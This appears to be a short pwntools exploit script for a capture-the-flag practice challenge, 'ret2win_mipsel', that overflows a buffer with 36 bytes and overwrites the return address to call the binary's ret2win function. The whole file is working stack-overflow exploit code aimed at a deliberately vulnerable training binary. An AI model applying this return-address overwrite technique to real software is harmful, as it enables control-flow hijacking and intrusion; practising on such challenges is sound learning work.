from pwn import *

context.binary = elf = ELF('./ret2win_mipsel')

p = elf.process()

#rop = ROP(elf)
#rop.ret

offset = 4*9
payload = b'f'*offset+p32(elf.sym['ret2win'])#+rop.chain()

p.recv()
p.sendline(payload)
p.interactive()

